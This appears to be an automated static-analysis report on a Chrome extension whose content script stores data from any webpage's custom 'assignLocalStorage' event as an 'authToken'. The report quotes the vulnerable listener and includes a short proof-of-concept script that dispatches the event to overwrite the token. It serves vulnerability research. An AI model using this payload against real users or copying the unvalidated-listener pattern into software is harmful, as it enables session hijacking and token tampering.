# CoCo Analysis: mhlchafhmgebjkmkjbcmghdelfpgaplo

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_assignLocalStorage → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mhlchafhmgebjkmkjbcmghdelfpgaplo/opgen_generated_files/cs_0.js
Line 553    document.addEventListener('assignLocalStorage', function (e) {
    e

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mhlchafhmgebjkmkjbcmghdelfpgaplo/opgen_generated_files/cs_0.js
Line 554      storage = e.detail;
    e.detail
```

**Code:**

```javascript
// Content script (cs_0.js) - Lines 553-566
document.addEventListener('assignLocalStorage', function (e) {
  storage = e.detail; // ← attacker-controlled
  chrome.storage.sync.set({ 'authToken': storage }, function (items) { // ← storage poisoning
      if(storage != null){
          chrome.runtime.sendMessage({greeting: "checkTabId"}, function(response) {
              setTimeout(function(){
                if (window.innerWidth == "450" || window.outerWidth == "450") {
                  window.close();
                }
              }, 1000);
          });
      }
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (document.addEventListener)

**Attack:**

```javascript
// Malicious webpage can dispatch custom event to poison extension storage
var maliciousData = {
    authorization: "Bearer attacker_token_here",
    userId: "attacker_user_id",
    // Any other malicious payload
};

var evt = document.createEvent("CustomEvent");
evt.initCustomEvent("assignLocalStorage", true, true, maliciousData);
document.dispatchEvent(evt);

// The extension will store the attacker's data in chrome.storage.sync as 'authToken'
```

**Impact:** Storage poisoning vulnerability. Any webpage where the content script runs (matches: "*://*/*") can dispatch the custom "assignLocalStorage" event with arbitrary data in `e.detail`. The extension blindly stores this attacker-controlled data in `chrome.storage.sync` under the key 'authToken'. This allows an attacker to overwrite the user's legitimate authentication token with malicious data, potentially leading to session hijacking, unauthorized access, or disruption of the extension's functionality. The poisoned data persists across browser sessions via chrome.storage.sync.
